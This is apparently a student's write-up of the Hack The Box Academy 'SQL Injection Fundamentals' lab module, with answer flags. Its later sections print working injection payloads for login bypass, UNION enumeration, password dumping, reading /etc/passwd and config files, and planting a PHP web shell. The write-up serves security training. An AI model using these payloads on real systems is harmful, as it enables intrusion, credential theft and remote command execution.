# SQL Injection Fundamentals

-   Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
-   Module: SQL Injection Fundamentals
-   Tier: 0
-   Difficulty: Medium
-   Category: Offensive
-   Time estimate: 8 hours
-   Date: 11-05-2022
-   Author: [DjikstraCS](https://github.com/DjikstraCS)

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#intro-to-mysql)

## Intro to MySQL

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220511152736.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220511152736.png)

_Hint: Make sure to specify the non-default MySQL port in your command._

First connect to the Database with `sql`.

```
┌──(kali㉿kali)-[~/XSStrike]
└─$ mysql -u root -h 138.68.158.33 -P 32598 -p         
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 16
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

Then display the databases.

```
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.043 sec)

MariaDB [(none)]> 
```

**Answer:** `employees`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#sql-statements)

## SQL Statements

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-1)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512151323.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512151323.png)

_Hint: View records under the 'departments' table_

First, we login and print the databases.

```
┌──(kali㉿kali)-[~]
└─$ mysql -u root -h 157.245.33.77 -P 32686 -p  
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 4
Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.081 sec)

MariaDB [(none)]> use employees
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

The `emplyees` database looks interesting.

```
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.072 sec)
```

Print the `departments` table.

```
MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
9 rows in set (0.068 sec)
```

**Answer:** `d005`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#query-results)

## Query Results

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-2)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512151748.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512151748.png)

_Hint: Use AND operator_

Login and find the employee database like in previous questions.

```
MariaDB [employees]> select * from employees where hire_date="1990-01-01" && first_name LIKE "Bar%";
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+
1 row in set (0.067 sec)
```

**Answer:** `Mitchem`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#sql-operators)

## SQL Operators

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-3)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512153141.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512153141.png)

_Hint: Use OR/NOT conditions. Use 'describe titles;' to get the necessary column names._

Login and select the `employee` database.

```
MariaDB [employees]> select * from titles where emp_no > 10000 or title!='Engineer' and title!='Senior Engineer' and title!='Assistant Engineer';
+--------+--------------------+------------+------------+
| emp_no | title              | from_date  | to_date    |
+--------+--------------------+------------+------------+
|  10001 | Senior Engineer    | 1986-06-26 | 9999-01-01 |
|  10002 | Senior Engineer    | 1995-12-03 | 9999-01-01 |
|  10003 | Engineer           | 1986-12-01 | 1995-12-01 |

(...)

|  10651 | Assistant Engineer | 1988-12-29 | 1997-12-29 |
|  10652 | Engineer           | 1997-12-29 | 2000-11-15 |
|  10653 | Senior Staff       | 2000-03-12 | 9999-01-01 |
|  10654 | Staff              | 1992-03-12 | 2000-03-12 |
+--------+--------------------+------------+------------+
654 rows in set (0.193 sec)

```

**Answer:** `654`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#subverting-query-logic)

## Subverting Query Logic

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-4)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512155257.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512155257.png)

_Hint: Check the cheat sheet for the payload needed._

The web page:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161641.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161641.png)

Payload: `tom' OR '1'='1`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161624.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161624.png)

**Answer:** `202a1d1a8b195d5e9a57e434cc16000c`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#using-comments)

## Using Comments

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-5)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161804.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512161804.png)

_Hint 1: Look at what the original query is doing, and try to inject a payload that changes its logic, and always logs in as user ID 5._

_Hint 2: use OR._

Comments in SQL:

```
-- <comment>
# <comment>
/*<comment>*/
```

Page is the same as last time.

This time, payload `' OR id = 5) -- <comment>` logs us in as `superadmin`.

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512163040.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512163040.png)

**Answer:** `cdad9ecdf6f14b45ff5c4de32909caec`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#union-clause)

## Union Clause

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-6)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512163606.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512163606.png)

_Hint: Use the 'describe' function to find number and names of columns in each table, to be able to form the proper 'union' query._

Login and select the `employee` database.

```
MariaDB [employees]> SELECT emp_no FROM employees UNION SELECT dept_no FROM departments;
+--------+
| emp_no |
+--------+
| 10001  |
| 10002  |
| 10003  |

(...)

| d007   |
| d008   |
| d009   |
+--------+
663 rows in set (0.071 sec)
```

**Answer:** `663`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#union-injection)

## Union Injection

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-7)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512165546.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512165546.png)

_Hint: Try to replicate the last example_

The page:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512173615.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512173615.png)

We can display the entire table with `' OR 1=1 -- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175222.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175222.png)

We want to find the total number of columns since some of them are often hidden.

This can be done with either `union` or `sort by`.

Payloads:

```
' order by <number>-- -
```

and

```
cn' UNION select 1,2,3,4-- -
```

UNION returns:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175157.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175157.png)

Now that we have confirmed that we have 4 columns, we can try and inject something in one of them to see if it displays.

Column number two seems to print the result.

Payload: `cn' UNION select 1,@@version,3,4-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512174912.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512174912.png)

To find the user, we will simply replace `@@verion` with `user()`.

Payload: `cn' union select 1,user(),3,4-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175625.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175625.png)

**Answer:** `root@localhost`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#database-enumeration)

## Database Enumeration

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-8)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175803.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512175803.png)

First, we need to get an overview of what databases in the DBMS We can utilize `INFORMATION_SCHEMA.SCHEMATA` for this.

Payload: `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602113519.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602113519.png)

Besides the default one, we have two databases `dev` and `ilfreight`.

In order to see which one we are accessing by default, we can use `database()`.

Payload: `cn' UNION select 1,database(),2,3-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114220.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114220.png)

We are in the correct database.

Now for finding the tables:

Payload: `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114330.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114330.png)

Great, the `users` table was what we were looking for.

Now we can get the column of that table.

Payload: `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114815.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602114815.png)

Now that we have all the information we need, we can extract the password.

Payload: `cn' UNION select 1, username, password, 4 from ilfreight.users-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602115214.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602115214.png)

**Answer:** `9da2c9bcdf39d8610954e0e11ea8f45f`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#reading-files)

## Reading Files

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-9)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512182854.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512182854.png)

_Hint: Once you identify the name of the imported configuration file, try to read the source of these files._

Like we saw in a previous question, we can use `user()` to see which user is running the database, which means it is the DBA (Data Base Administrator).

Payload: `cn' UNION SELECT 1, user(), 3, 4-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602120341.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602120341.png)

Looks like the database is running as `root`.

Now we need to find out what privileges the user has.

Payload: `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602120501.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602120501.png)

`Y` means `yes` confirming that we have superuser privileges.

We need to dig a little deeper into our privileges.

Payload: `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602121644.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602121644.png)

We have `FILE` permission, meaning we can load files and maybe even write files.

We can try and read the `/etc/passwd` file.

Payload: `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602122325.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602122325.png)

Great! We have access.

We know that the page we are working on is `search.php` and that the default Apache web directory is `/var/www/html`. Maybe we can get the source code of the file?

Payload: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

Clicking `CTRL + U` to view the source code.

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602123309.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602123309.png)

There is a config.php file. Let's get it.

Payload: `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602123504.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602123504.png)

**Answer:** `dB_pAssw0rd_iS_flag!`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#writing-files)

## Writing Files

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-10)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512182945.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512182945.png)

_Hint: It's one directory away from you!_

First, we need to confirm that we have write access to the system.

Payload: `cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602125846.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602125846.png)

`SECURE_FILE_PRIV` is empty, meaning we can read and write to any location.

In order to test if this is true, we can write a file to the web root directory and try and access it via the browser.

Payload: `cn' union select 1,'File written successfully!',3,4,5 into outfile '/var/www/html/hax.txt'-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602130443.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602130443.png)

We got access to the file, confirming that we have write access to the system.

Let's upload a shell.

Payload: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -`

Now we can execute commands via the URL. Looking around for a bit, we find the flag.

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602132121.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602132121.png)

**Answer:** `d2b5b27ae688b6a0f1d21b7d3a0798cd`

---

## [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#skills-assessment)

## Skills Assessment

### [](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/SQL%20Injection%20Fundamentals.md#question-11)

### Question:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512183044.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220512183044.png)

_Hint: Try to read files you know to find a location you can write to._

We get a login page:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602134157.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602134157.png)

First, we can use a simple injection to bypass the login page.

Payload for username field: `' OR 1=1 -- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602134321.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220602134321.png)

On the new page there is a search field, maybe we can exploit that too.

We will try to make an injection that tells us how many columns the database being displayed on the page has.

Payload: `' order by 5-- -`

It has 5 columns.

We can now make a union attack.

Payload: `' union select 1,user(),3,4,5-- -`

We will try to upload a shell script right away.

Payload: `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -`

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220608150949.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220608150949.png)

Success! We can execute commands.

Cat the flag:

[![](https://github.com/DjikstraCS/CTF-Write-Ups/raw/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220608150753.png)](https://github.com/DjikstraCS/CTF-Write-Ups/blob/main/Hack%20The%20box/Academy/attachments/Pasted%20image%2020220608150753.png)

**Answer:** `528d6d9cedc2c7aab146ef226e918396`

---

**Tags:** [[Hack The Box Academy]]